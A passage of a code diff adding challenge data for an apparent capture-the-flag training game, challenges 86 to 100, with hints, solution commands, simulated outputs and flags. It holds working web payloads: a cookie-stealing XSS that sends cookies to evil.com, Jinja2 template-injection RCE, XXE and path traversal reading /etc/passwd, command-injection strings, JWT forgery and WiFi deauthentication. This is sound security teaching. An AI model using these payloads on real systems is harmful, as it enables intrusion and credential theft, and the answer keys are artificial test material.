+      hints: ['Try injecting <script> tags in input fields.', 'Check URL parameters for reflection.'],
+      solutions: ['curl "http://target.local/search?q=<script>alert(1)</script>"', 'curl http://target.local/search?q=%3Cscript%3Ealert(1)%3C/script%3E'],
+      simulatedResponse: '--- XSS Exploitation ---\n\n$ curl "http://target.local/search?q=<script>document.location=\'http://evil.com/steal?\'+document.cookie</script>"\n\nReflected in page:\n<p>Results for: <script>...</script></p>\n\n[*] XSS triggered!\n[*] Cookie stolen: session=admin; flag=CTF{xss_4tt4ck}\n\nFlag: CTF{xss_4tt4ck}',
+      flag: 'CTF{xss_4tt4ck}',
+      successMessage: '📝 XSS exploited!'
+    },
+    {
+      id: 'ctf-87', title: 'CSRF Attack', difficulty: 'expert', xp: 100,
+      description: 'Craft a CSRF payload to change the admin password on the target application.',
+      objective: 'Perform a Cross-Site Request Forgery.',
+      hints: ['CSRF exploits the browser\'s auto-authentication.', 'Create a hidden form that submits automatically.'],
+      solutions: ['curl -X POST http://target.local/admin/change-password -d "password=hacked" -b "session=admin_token"'],
+      simulatedResponse: '--- CSRF Exploitation ---\n\n[*] Crafted CSRF payload:\n<form action="http://target.local/admin/change-password" method="POST">\n  <input type="hidden" name="password" value="hacked">\n</form>\n<script>document.forms[0].submit();</script>\n\n[*] Admin visited the malicious page!\n[*] Password changed successfully!\n[*] Logged in as admin...\n\n$ cat /admin/flag\nCTF{csrf_f0rg3ry}\n\nFlag: CTF{csrf_f0rg3ry}',
+      flag: 'CTF{csrf_f0rg3ry}',
+      successMessage: '🎭 CSRF attack successful!'
+    },
+    {
+      id: 'ctf-88', title: 'SSRF Attack', difficulty: 'expert', xp: 100,
+      description: 'Exploit a Server-Side Request Forgery to access internal services through the target.',
+      objective: 'Perform SSRF to reach internal networks.',
+      hints: ['SSRF makes the server fetch internal URLs.', 'Try: curl "http://target.local/fetch?url=http://localhost:8080"'],
+      solutions: ['curl "http://target.local/fetch?url=http://localhost:8080/admin"', 'curl "http://target.local/fetch?url=http://127.0.0.1:8080"'],
+      simulatedResponse: '--- SSRF Exploitation ---\n\n$ curl "http://target.local/fetch?url=http://localhost:8080/internal/flag"\n\n[*] Server fetched internal URL!\n[*] Response from internal service:\n\n{\n  "internal": true,\n  "flag": "CTF{ssrf_1nt3rn4l}",\n  "message": "This should not be accessible from outside!"\n}\n\nFlag: CTF{ssrf_1nt3rn4l}',
+      flag: 'CTF{ssrf_1nt3rn4l}',
+      successMessage: '🌐 SSRF exploited!'
+    },
+    {
+      id: 'ctf-89', title: 'XXE Injection', difficulty: 'expert', xp: 100,
+      description: 'Exploit an XML External Entity (XXE) injection to read /etc/passwd from the server.',
+      objective: 'Perform XXE to read server files.',
+      hints: ['XXE uses DOCTYPE to define external entities.', 'Define an entity pointing to file:///etc/passwd'],
+      solutions: ['curl -X POST -d \'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>\' http://target.local/api/xml'],
+      simulatedResponse: '--- XXE Injection ---\n\n[*] Sending malicious XML payload...\n[*] Server parsed the external entity!\n\nResponse:\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nflag_user:x:1000:1000:CTF{xxe_1nj3ct10n}:/home/flag:/bin/bash\n\nFlag: CTF{xxe_1nj3ct10n}',
+      flag: 'CTF{xxe_1nj3ct10n}',
+      successMessage: '📄 XXE injection exploited!'
+    },
+    {
+      id: 'ctf-90', title: 'SSTI Attack', difficulty: 'expert', xp: 100,
+      description: 'Exploit a Server-Side Template Injection in a Jinja2 template engine.',
+      objective: 'Exploit template engines for RCE.',
+      hints: ['Try {{7*7}} in input fields.', 'Jinja2: {{config}} or {{request.application.__globals__}}'],
+      solutions: ['curl "http://target.local/profile?name={{7*7}}"', 'curl "http://target.local/profile?name={{config}}"'],
+      simulatedResponse: '--- SSTI Exploitation ---\n\n$ curl "http://target.local/profile?name={{7*7}}"\nHello 49!  ← Template injection confirmed!\n\n$ curl "http://target.local/profile?name={{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'cat /flag.txt\').read()}}"\n\nHello CTF{sst1_t3mpl4t3}!\n\nFlag: CTF{sst1_t3mpl4t3}',
+      flag: 'CTF{sst1_t3mpl4t3}',
+      successMessage: '🧩 Template injection exploited!'
+    },
+    {
+      id: 'ctf-91', title: 'Deserialization', difficulty: 'expert', xp: 100,
+      description: 'Exploit an insecure deserialization vulnerability in a Java application.',
+      objective: 'Exploit unsafe object deserialization.',
+      hints: ['Java deserialization can lead to RCE.', 'Use ysoserial to generate payloads.'],
+      solutions: ['java -jar ysoserial.jar CommonsCollections1 "cat /flag.txt" | base64', 'curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.bin http://target.local/api'],
+      simulatedResponse: '--- Deserialization Exploit ---\n\n[*] Generating payload with ysoserial...\n[*] Using CommonsCollections1 gadget chain\n[*] Command: cat /flag.txt\n\n[*] Sending serialized payload to /api endpoint...\n[*] Server deserialized our malicious object!\n[*] Command executed!\n\nOutput: CTF{d3s3r14l1z4t10n}\n\nFlag: CTF{d3s3r14l1z4t10n}',
+      flag: 'CTF{d3s3r14l1z4t10n}',
+      successMessage: '💊 Deserialization exploited!'
+    },
+    {
+      id: 'ctf-92', title: 'AWS S3 Bucket', difficulty: 'expert', xp: 100,
+      description: 'Enumerate and access a misconfigured public S3 bucket "ctf-challenge-bucket".',
+      objective: 'Exploit cloud storage misconfigurations.',
+      hints: ['aws s3 ls lists bucket contents.', 'Public buckets can be accessed without auth.'],
+      solutions: ['aws s3 ls s3://ctf-challenge-bucket --no-sign-request', 'curl https://ctf-challenge-bucket.s3.amazonaws.com/'],
+      simulatedResponse: '--- S3 Bucket Enumeration ---\n\n$ aws s3 ls s3://ctf-challenge-bucket --no-sign-request\n\n2026-01-01 00:00:00       1234 index.html\n2026-01-01 00:00:00        567 config.json\n2026-01-01 00:00:00         28 flag.txt\n2026-01-01 00:00:00      89012 backup.sql\n\n$ aws s3 cp s3://ctf-challenge-bucket/flag.txt - --no-sign-request\nCTF{s3_buck3t_l34k}\n\nFlag: CTF{s3_buck3t_l34k}',
+      flag: 'CTF{s3_buck3t_l34k}',
+      successMessage: '☁️ S3 bucket exploited!'
+    },
+    {
+      id: 'ctf-93', title: 'JWT Exploitation', difficulty: 'expert', xp: 100,
+      description: 'Exploit a JWT (JSON Web Token) by changing the algorithm to "none" to forge admin access.',
+      objective: 'Bypass JWT authentication.',
+      hints: ['JWT has three parts: header.payload.signature', 'Change "alg" to "none" and remove signature.'],
+      solutions: ['curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ." http://target.local/admin'],
+      simulatedResponse: '--- JWT Exploitation ---\n\n[*] Original JWT:\nHeader: {"alg":"HS256","typ":"JWT"}\nPayload: {"role":"user"}\n\n[*] Forged JWT (alg=none):\nHeader: {"alg":"none","typ":"JWT"}\nPayload: {"role":"admin"}\n\n$ curl -H "Authorization: Bearer [forged_token]" http://target.local/admin\n\n{"status":"success","message":"Welcome, admin!","flag":"CTF{jwt_f0rg3ry}"}\n\nFlag: CTF{jwt_f0rg3ry}',
+      flag: 'CTF{jwt_f0rg3ry}',
+      successMessage: '🎫 JWT forged!'
+    },
+    {
+      id: 'ctf-94', title: 'Command Injection', difficulty: 'expert', xp: 100,
+      description: 'Exploit a command injection vulnerability in a web app\'s ping function.',
+      objective: 'Inject OS commands through web inputs.',
+      hints: ['Try: 127.0.0.1; cat /flag.txt', 'Semicolons, pipes, and backticks can break out.'],
+      solutions: ['curl "http://target.local/ping?ip=127.0.0.1;cat /flag.txt"', 'curl "http://target.local/ping?ip=127.0.0.1|cat+/flag.txt"'],
+      simulatedResponse: '--- Command Injection ---\n\n$ curl "http://target.local/ping?ip=127.0.0.1; cat /flag.txt"\n\nPING 127.0.0.1: 1 packets transmitted, 1 received\n\nCTF{cmd_1nj3ct10n}\n\nFlag: CTF{cmd_1nj3ct10n}',
+      flag: 'CTF{cmd_1nj3ct10n}',
+      successMessage: '💉 Command injected!'
+    },
+    {
+      id: 'ctf-95', title: 'LFI Attack', difficulty: 'expert', xp: 100,
+      description: 'Exploit a Local File Inclusion vulnerability to read /etc/passwd.',
+      objective: 'Read server files through LFI.',
+      hints: ['LFI includes local files.', 'Try: ?page=../../../../etc/passwd'],
+      solutions: ['curl "http://target.local/page.php?page=../../../../etc/passwd"', 'curl "http://target.local/page.php?page=....//....//....//etc/passwd"'],
+      simulatedResponse: '--- LFI Exploitation ---\n\n$ curl "http://target.local/page.php?page=../../../../etc/passwd"\n\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nctf_flag:x:1337:1337:CTF{lf1_4tt4ck}:/dev/null:/bin/false\n\nFlag: CTF{lf1_4tt4ck}',
+      flag: 'CTF{lf1_4tt4ck}',
+      successMessage: '📂 LFI exploited!'
+    },
+    {
+      id: 'ctf-96', title: 'DNS Rebinding', difficulty: 'expert', xp: 100,
+      description: 'Exploit a DNS rebinding attack to bypass same-origin policy and access internal services.',
+      objective: 'Understand DNS rebinding attacks.',
+      hints: ['DNS rebinding changes IP resolution.', 'First resolve to attacker, then to internal IP.'],
+      solutions: ['dig rebind.attacker.com', 'nslookup rebind.attacker.com'],
+      simulatedResponse: '--- DNS Rebinding Attack ---\n\n[*] Setting up DNS rebinding service...\n[*] First query: rebind.attacker.com → 1.2.3.4 (attacker)\n[*] Second query: rebind.attacker.com → 127.0.0.1 (internal)\n\n[*] Browser fetches from 1.2.3.4 (loads attacker JS)\n[*] Browser fetches from 127.0.0.1 (same domain, bypasses SOP!)\n\n[*] Internal service accessed!\n[*] Response: {"secret": "CTF{dns_r3b1nd1ng}"}\n\nFlag: CTF{dns_r3b1nd1ng}',
+      flag: 'CTF{dns_r3b1nd1ng}',
+      successMessage: '🔄 DNS rebinding successful!'
+    },
+    {
+      id: 'ctf-97', title: 'Wireless Deauth', difficulty: 'expert', xp: 100,
+      description: 'Simulate a WiFi deauthentication attack to capture a WPA handshake.',
+      objective: 'Understand wireless security attacks.',
+      hints: ['aireplay-ng sends deauth frames.', 'airodump-ng captures handshakes.'],
+      solutions: ['aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon', 'airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon'],
+      simulatedResponse: '--- WiFi Deauth Attack (Simulated) ---\n\n$ airodump-ng wlan0mon\n\n BSSID              CH  ENC   ESSID\n AA:BB:CC:DD:EE:FF   6  WPA2  CTF_Network\n\n$ aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon\n[*] Sending 5 deauthentication frames...\n[*] Client disconnected!\n\n$ airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\n[*] WPA handshake captured!\n\n$ aircrack-ng capture.cap -w wordlist.txt\nKEY FOUND! [ CTF{w1f1_d34uth} ]\n\nFlag: CTF{w1f1_d34uth}',
+      flag: 'CTF{w1f1_d34uth}',
+      successMessage: '📶 WiFi handshake captured!'
+    },
+    {
+      id: 'ctf-98', title: 'Binary RE', difficulty: 'expert', xp: 100,
+      description: 'Reverse engineer a binary "crackme" to find the hardcoded flag.',
+      objective: 'Basic binary reverse engineering.',
+      hints: ['strings extracts readable text.', 'objdump or gdb can disassemble.'],
+      solutions: ['strings crackme', 'strings crackme | grep CTF', 'objdump -d crackme'],
+      simulatedResponse: '--- Binary Reverse Engineering ---\n\n$ strings crackme | grep CTF\n(no results)\n\n$ objdump -d crackme | grep -A5 "compare"\n  4011a0: cmp $0x43,%al     # \'C\'\n  4011a4: cmp $0x54,%al     # \'T\'\n  4011a8: cmp $0x46,%al     # \'F\'\n\n[*] Reconstructing from assembly...\n[*] Flag characters: C-T-F-{-r-3-v-3-r-s-3-d-}\n\nFlag: CTF{r3v3rs3d}',
+      flag: 'CTF{r3v3rs3d}',
+      successMessage: '🔬 Binary reversed!'
+    },
+    {
+      id: 'ctf-99', title: 'Steganography', difficulty: 'expert', xp: 100,
+      description: 'Extract a hidden message from an image file using steganography techniques.',
+      objective: 'Detect and extract hidden data in images.',
+      hints: ['steghide or binwalk can extract hidden data.', 'steghide extract -sf image.jpg'],
+      solutions: ['steghide extract -sf image.jpg', 'binwalk image.jpg', 'strings image.jpg | grep CTF'],
+      simulatedResponse: '--- Steganography Analysis ---\n\n$ steghide extract -sf image.jpg\nEnter passphrase: (empty)\n\nwrote extracted data to "hidden.txt"\n\n$ cat hidden.txt\n=== TOP SECRET ===\nThe flag is: CTF{st3g4n0gr4phy}\nThis message was hidden inside the image.\n\nFlag: CTF{st3g4n0gr4phy}',
+      flag: 'CTF{st3g4n0gr4phy}',
+      successMessage: '🖼️ Hidden message extracted!'
+    },
+    {
+      id: 'ctf-100', title: 'The Ultimate CTF', difficulty: 'expert', xp: 200,
+      description: 'FINAL BOSS: Chain every skill you have learned. Reconnaissance, exploitation, privilege escalation, and data exfiltration. You are the elite hacker.',
+      objective: 'Complete the ultimate multi-stage CTF challenge.',
+      hints: ['Start with recon: nmap, dig, whois.', 'Exploit, escalate, exfiltrate.'],
+      solutions: ['nmap -sV 10.13.37.100', 'ping 10.13.37.100', 'curl http://10.13.37.100'],
+      simulatedResponse: '╔══════════════════════════════════════════════════════╗\n║           🏆 THE ULTIMATE CTF CHALLENGE 🏆           ║\n╚══════════════════════════════════════════════════════╝\n\n══ Stage 1: Reconnaissance ══\n→ nmap -sV 10.13.37.100: SSH(22), HTTP(80), MySQL(3306)\n→ dig target.ctf: Internal DNS reveals admin.target.ctf\n\n══ Stage 2: Initial Access ══\n→ SQL Injection on login page\n→ Gained www-data shell\n\n══ Stage 3: Privilege Escalation ══\n→ Found SUID binary: /usr/local/bin/backup\n→ PATH hijacking → root shell\n\n══ Stage 4: Data Exfiltration ══\n→ cat /root/ultimate_flag.txt\n\n🎊🎊🎊 CONGRATULATIONS! 🎊🎊🎊\n\nYou have completed ALL 100 CTF challenges!\n\n╔══════════════════════════════════════════════════════╗\n║  Flag: CTF{ult1m4t3_h4ck3r_l3g3nd}                  ║\n║  Title: Cybersecurity Grandmaster                    ║\n║  Rank: ★★★★★★ LEGENDARY                             ║\n║  Challenges Completed: 100/100                       ║\n╚══════════════════════════════════════════════════════╝',
+      flag: 'CTF{ult1m4t3_h4ck3r_l3g3nd}',
+      successMessage: '🏆🏆🏆 ULTIMATE CTF LEGEND! All 100 challenges conquered! You are a Cybersecurity Grandmaster! 🏆🏆🏆'
     }
   ]
 };
